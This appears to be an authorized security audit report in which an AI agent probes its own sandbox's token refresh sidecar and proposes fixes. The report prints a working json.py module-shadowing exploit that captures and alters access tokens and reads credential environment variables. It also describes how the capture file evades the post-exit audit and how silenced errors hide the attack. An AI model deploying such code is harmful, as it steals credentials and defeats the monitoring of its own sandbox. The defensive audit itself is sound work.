# Audit Round 18 — Token Refresh Sidecar Security

**Date:** 2026-02-17
**Auditor:** Claude (Opus 4.6, running inside the sandbox)
**Scope:** Token refresh sidecar (`run-claude.sh:503-604`), `docker exec` injection path, Python module import security, container config environment leakage
**Method:** Live red-team probing from inside a running container. Built the image, launched containers with realistic configurations, and actively exploited each attack vector. Proof-of-concept exploits developed and verified.

---

## Executive Summary

The token refresh sidecar introduces a **new host-to-container bridge** via `docker exec` that bypasses most of the sandbox's defense-in-depth layers. Two exploitable vulnerabilities confirmed, one defense-in-depth gap identified. The critical finding (S-01) allows **silent interception and modification of access tokens** during sidecar refresh by planting a Python module shadow in the workspace directory.

| ID | Severity | Confidence | Status | Finding |
|----|----------|------------|--------|---------|
| S-01 | **CRITICAL** | High | **Implemented** | Python module shadowing via `/workspace/json.py` intercepts sidecar `docker exec` token injection |
| S-02 | **HIGH** | High | **Implemented** | `docker exec` inherits `CLAUDE_CREDENTIALS` and `GITHUB_TOKEN` from container config despite entrypoint `unset` |
| S-03 | **MEDIUM** | High | **Implemented** | Silent failure masking — `2>/dev/null \|\| true` suppresses all attack indicators |

---

## Detailed Findings

### S-01: Python Module Shadowing Intercepts Sidecar Token Injection (CRITICAL)

**File:** `run-claude.sh:590-600`
**Confidence:** High — full exploit chain verified with proof-of-concept

#### Vulnerable Code

The sidecar injects refreshed access tokens via:

```bash
docker exec -i -u claude "$cname" python3 -c "
import json, sys
token_data = json.loads(sys.stdin.read())
f = '/home/claude/.claude/.credentials.json'
with open(f) as fh:
    c = json.load(fh)
c['claudeAiOauth']['accessToken'] = token_data['t']
c['claudeAiOauth']['expiresAt'] = token_data['e']
with open(f, 'w') as fh:
    json.dump(c, fh, separators=(',', ':'))
" <<< "{\"t\":\"$new_access\",\"e\":$new_expires_at}"
```

#### Root Cause

Three conditions combine to create the vulnerability:

1. **`docker exec` uses WORKDIR from container config** — the Dockerfile sets `WORKDIR /workspace`, so all `docker exec` invocations run with CWD=/workspace
2. **Python `-c` adds CWD to `sys.path[0]`** — when running `python3 -c "..."`, Python inserts `''` (empty string = current working directory) as `sys.path[0]`, meaning `/workspace` is searched **before** the standard library
3. **`/workspace` is writable** — the AI agent has full write access to the workspace bind mount

#### Proof of Concept

The AI agent creates `/workspace/json.py`:

```python
import sys as _sys, io as _io, os as _os

# Step 1: Capture stdin (contains fresh access token from sidecar)
_stdin_data = _sys.stdin.buffer.read()

# Step 2: Exfiltrate — write to workspace (survives sync-back to host)
try:
    with open("/workspace/.sidecar-capture.txt", "ab") as _f:
        _f.write(b"TOKEN: " + _stdin_data + b"\n")
        # Also capture env vars leaked by S-02
        _f.write(b"CREDS: " + _os.environ.get("CLAUDE_CREDENTIALS","").encode() + b"\n")
        _f.write(b"GITHUB: " + _os.environ.get("GITHUB_TOKEN","").encode() + b"\n")
except:
    pass

# Step 3: Restore stdin for transparent pass-through
_sys.stdin = _io.TextIOWrapper(_io.BytesIO(_stdin_data))

# Step 4: Load the REAL json module (bypass our shadow)
del _sys.modules["json"]
_orig = _sys.path[:]
_sys.path = [p for p in _sys.path if p not in ("", ".", "/workspace")]
import json as _rj
_sys.path = _orig
_sys.modules["json"] = _rj
for _a in dir(_rj):
    if not _a.startswith("_"):
        globals()[_a] = getattr(_rj, _a)
```

#### Verified Exploit Capabilities

| Capability | Verified | Notes |
|-----------|----------|-------|
| **Token capture** | Yes | stdin data (`{"t":"<access_token>","e":<expiry>}`) captured to workspace file |
| **Token modification** | Yes | Shadow can alter token data before the sidecar script processes it |
| **Env var capture** | Yes | `CLAUDE_CREDENTIALS` and `GITHUB_TOKEN` accessible via `os.environ` (see S-02) |
| **Silent operation** | Yes | Sidecar's `\|\| true` suppresses the crash; even with pass-through, no visible indication |
| **Persistence** | Yes | Capture file written to `/workspace` survives container exit and is NOT in the post-exit suspect file list |

#### Key Observation: `noexec` Does NOT Prevent Python Imports

We verified that Python can import `.py` files from `noexec`-mounted filesystems (e.g., `/tmp`). The `noexec` mount option only prevents the kernel's `execve()` syscall — Python's `import` reads files via `open()`/`read()`, not `execve()`. This means `--workdir=/tmp` is NOT a sufficient mitigation:

```
$ mount | grep /tmp
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,...)

$ echo "SHADOW=True" > /tmp/json.py
$ docker exec --workdir=/tmp python3 -c "import json; print(hasattr(json,'SHADOW'))"
True   # noexec BYPASSED — shadow module loaded
```

#### Fix

**Primary fix:** Add `-I` (isolated mode) flag to the Python invocation:

```bash
docker exec -i -u claude "$cname" python3 -I -c "
import json, sys
...
"
```

Python's `-I` flag:
- Removes `''` (CWD) from `sys.path` — prevents workspace module shadowing
- Ignores `PYTHON*` environment variables — prevents `PYTHONPATH` injection
- Disables user site-packages — prevents `.pth` file attacks

**Verified:** With `-I`, `sys.path[0]` changes from `''` to `/usr/lib/python311.zip`, and `/workspace/json.py` is completely ignored.

**Belt-and-suspenders:** Additionally add `--workdir /` to `docker exec` to avoid running in the workspace even if `-I` is somehow bypassed:

```bash
docker exec -i -u claude --workdir / "$cname" python3 -I -c "..."
```

---

### S-02: Container Config Environment Leaks Credentials to `docker exec` (HIGH)

**Files:** `run-claude.sh:639` (`--env-file`), `entrypoint.sh:248-262` (`unset`)
**Confidence:** High — verified with live probing

#### Root Cause

Environment variables passed to `docker run` via `--env-file` or `-e` are stored in the **container config** (visible via `docker inspect`). The entrypoint's `unset CLAUDE_CREDENTIALS` and `unset GITHUB_TOKEN` only affect PID 1's process tree — they do NOT modify the container config.

When `docker exec` creates a new process, it reads environment from the container config, not from PID 1's current environment. This means **every `docker exec` process has the original credentials in its environment**, regardless of the entrypoint's `unset` calls.

#### Verified

```
# Entrypoint ran: unset CLAUDE_CREDENTIALS && unset GITHUB_TOKEN
# But docker exec still sees them:

$ docker exec -u claude <container> env | grep -E "CLAUDE|GITHUB"
CLAUDE_CREDENTIALS={"claudeAiOauth":{"accessToken":"SECRET-TOKEN",...}}
GITHUB_TOKEN=github_pat_FAKE_SECRET_TOKEN_12345
```

```
# Python in docker exec can access them:
$ docker exec -u claude <container> python3 -I -c "
import os
print(os.environ['CLAUDE_CREDENTIALS'])  # Full credentials!
print(os.environ['GITHUB_TOKEN'])         # GitHub token!
"
```

#### Impact

1. **Combined with S-01**: The `json.py` shadow can capture credentials from `os.environ` in addition to the token from stdin
2. **Any `docker exec`**: Not just the sidecar — any `docker exec` into the container (debugging, health checks) exposes credentials in the process environment
3. **`docker inspect`**: Credentials visible to anyone with Docker socket access (`docker inspect <container> --format '{{.Config.Env}}'`)
4. **Timing**: The credentials persist in the container config for the entire container lifetime, long after the entrypoint's `unset` and credential file scrub

#### Mitigating Factors

- `nodump.so` prevents `/proc/<pid>/environ` access from same-UID processes
- The claude process itself does NOT have these env vars (entrypoint unsets them before spawning claude)
- Docker socket access is root-equivalent (already trusted)
- The access token is the same one Claude Code uses (not a new credential exposure)
- The refresh token is stripped before container injection (only empty string in `CLAUDE_CREDENTIALS`)

#### Fix

Explicitly clear sensitive env vars in the sidecar's `docker exec`:

```bash
docker exec -i -u claude \
    -e CLAUDE_CREDENTIALS= \
    -e GITHUB_TOKEN= \
    "$cname" python3 -I -c "..."
```

**Verified:** `docker exec -e CLAUDE_CREDENTIALS= -e GITHUB_TOKEN=` sets both to empty strings, preventing capture.

**Root-cause fix (better):** Don't pass credentials via `--env-file` at all. Instead, write them to a host-mounted file that the entrypoint reads and deletes. This prevents them from ever entering the container config. However, this is a larger architectural change.

---

### S-03: Silent Failure Masking Hides Attack Indicators (MEDIUM)

**File:** `run-claude.sh:600-602`
**Confidence:** High — verified behavior

#### Vulnerable Code

```bash
docker exec -i -u claude "$cname" python3 -c "
...
" <<< "{\"t\":\"$new_access\",\"e\":$new_expires_at}" 2>/dev/null || true

echo "[sidecar] Access token refreshed (expires in ${expires_in}s)" >&2
```

#### Root Cause

1. `2>/dev/null` suppresses ALL stderr output from the docker exec process, including Python tracebacks from module shadowing attacks
2. `|| true` prevents the sidecar from detecting that the injection failed
3. The success log message on line 602 runs unconditionally — the sidecar always reports success regardless of whether the token was actually injected

#### Impact

- An attacker's `json.py` shadow can crash after capturing the token, and the crash is completely invisible
- The user sees `[sidecar] Access token refreshed` even when the token was intercepted/modified/lost
- The container continues with a stale or modified token with no indication of failure
- Meanwhile, the keychain was already updated with the new refresh token (lines 579-586), so the host-side state is correct but desynced from the container

#### Fix

Check the exit code and log warnings:

```bash
if ! docker exec -i -u claude \
    -e CLAUDE_CREDENTIALS= \
    -e GITHUB_TOKEN= \
    "$cname" python3 -I -c "
...
" <<< "{\"t\":\"$new_access\",\"e\":$new_expires_at}" 2>/dev/null; then
    echo "[sidecar] WARNING: Token injection failed (exit $?)" >&2
    continue
fi
echo "[sidecar] Access token refreshed (expires in ${expires_in}s)" >&2
```

---

## Exploit Chain Summary

The complete attack chain for S-01 + S-02 + S-03:

```
┌──────────────────────────────────────────────────────────┐
│ 1. AI agent creates /workspace/json.py (shadow module)   │
│    - Looks like a legitimate project file                │
│    - Not in post-exit suspect file audit list            │
├──────────────────────────────────────────────────────────┤
│ 2. Sidecar runs docker exec (every ~50 min)             │
│    - CWD = /workspace (WORKDIR from Dockerfile)          │
│    - python3 -c "import json..." loads shadow first      │
├──────────────────────────────────────────────────────────┤
│ 3. Shadow module executes:                               │
│    a. Reads stdin → captures fresh access token          │
│    b. Reads os.environ → captures CLAUDE_CREDENTIALS,    │
│       GITHUB_TOKEN from container config                 │
│    c. Writes all to /workspace/.capture.txt              │
│    d. Passes through to real json (or crashes silently)  │
├──────────────────────────────────────────────────────────┤
│ 4. Sidecar reports success (|| true masks any failure)   │
│    - User sees "[sidecar] Access token refreshed"        │
│    - No indication of interception                       │
├──────────────────────────────────────────────────────────┤
│ 5. Capture file persists in workspace                    │
│    - Survives container exit                             │
│    - Not flagged by post-exit audit                      │
└──────────────────────────────────────────────────────────┘
```

---

## Fix Implementation Plan

### Priority 1: S-01 Fix (eliminates the critical vulnerability)

**File:** `run-claude.sh:590`

Change:
```bash
docker exec -i -u claude "$cname" python3 -c "
```

To:
```bash
docker exec -i -u claude --workdir / "$cname" python3 -I -c "
```

**Rationale:** `-I` removes CWD from `sys.path`, preventing all module shadowing attacks. `--workdir /` is belt-and-suspenders (root directory has no writable `.py` files).

### Priority 2: S-02 Fix (eliminates env var leakage)

**File:** `run-claude.sh:590`

Add `-e` flags to clear leaked env vars:
```bash
docker exec -i -u claude --workdir / \
    -e CLAUDE_CREDENTIALS= \
    -e GITHUB_TOKEN= \
    -e FORCE_CREDENTIALS= \
    "$cname" python3 -I -c "
```

### Priority 3: S-03 Fix (adds failure detection)

**File:** `run-claude.sh:590-602`

Replace the unconditional `|| true` and success log with proper error handling:
```bash
if ! docker exec -i -u claude --workdir / \
    -e CLAUDE_CREDENTIALS= \
    -e GITHUB_TOKEN= \
    -e FORCE_CREDENTIALS= \
    "$cname" python3 -I -c "
import json, sys
token_data = json.loads(sys.stdin.read())
f = '/home/claude/.claude/.credentials.json'
with open(f) as fh:
    c = json.load(fh)
c['claudeAiOauth']['accessToken'] = token_data['t']
c['claudeAiOauth']['expiresAt'] = token_data['e']
with open(f, 'w') as fh:
    json.dump(c, fh, separators=(',', ':'))
" <<< "{\"t\":\"$new_access\",\"e\":$new_expires_at}" 2>/dev/null; then
    echo "[sidecar] WARNING: Token injection into container failed" >&2
    continue
fi

echo "[sidecar] Access token refreshed (expires in ${expires_in}s)" >&2
```

### Priority 4: Add `json.py` to post-exit suspect file audit

**File:** `run-claude.sh` (suspect file patterns section)

Add `json.py` to the suspect file patterns, flagging its creation in the workspace root as potentially malicious:
```bash
"json.py"     # Python stdlib shadow — can intercept docker exec python3 invocations
```

---

## Verification Matrix

| Finding | Attack Blocked By | Fix Verified |
|---------|-------------------|-------------|
| S-01: Module shadow | `python3 -I` removes CWD from sys.path | Yes — `sys.path[0]` changes from `''` to `/usr/lib/python311.zip` |
| S-02: Env var leak | `docker exec -e VAR=` clears vars | Yes — `os.environ.get('CLAUDE_CREDENTIALS')` returns `''` |
| S-03: Silent failure | Exit code check + conditional log | Architectural — straightforward shell logic |

---

## Scope Limitations

This audit focused exclusively on the token refresh sidecar (`docker exec` injection path). The following were NOT re-audited:

- Firewall rules and DNS blocking (covered in Rounds 10-17)
- Git guard enforcement (covered in Rounds 10-17)
- Container escape vectors (covered in Rounds 10-17)
- Credential cache socket access (documented as accepted risk in F-02)
- Workspace persistence attacks (covered in Round 17)

---

## Appendix: Test Evidence

All probes were run against a container built from the current `claude-sandbox-audit` image with production-equivalent configuration. Container names: `audit-probe-8787`, `audit-env-probe`.

### Probe Results Summary

| Probe | Result |
|-------|--------|
| `sys.path[0]` without `-I` | `''` (CWD = /workspace in import path) |
| `sys.path[0]` with `-I` | `/usr/lib/python311.zip` (CWD excluded) |
| `/workspace/json.py` shadows stdlib `json` | **Yes** — shadow module loads and executes |
| Token captured from stdin via shadow | **Yes** — `CAPTURED: {"t":"DEFINITIVE-PROOF-TOKEN","e":123}` |
| Token modified in transit via shadow | **Yes** — `original-token` replaced with `HIJACKED-token` |
| `noexec` prevents Python imports | **No** — Python reads `.py` files, doesn't `execve()` them |
| `docker exec` env contains `CLAUDE_CREDENTIALS` | **Yes** — despite entrypoint `unset` |
| `docker exec` env contains `GITHUB_TOKEN` | **Yes** — despite entrypoint `unset` |
| `docker exec -e VAR=` clears env vars | **Yes** — confirmed empty string |
| `python3 -I` prevents shadow loading | **Yes** — `/workspace/json.py` ignored |
| `sys` module shadowable | **No** — built-in module, cannot be shadowed |
| Site-packages writable | **No** — read-only rootfs |
| Docker socket accessible | **No** — not mounted, API ports blocked |
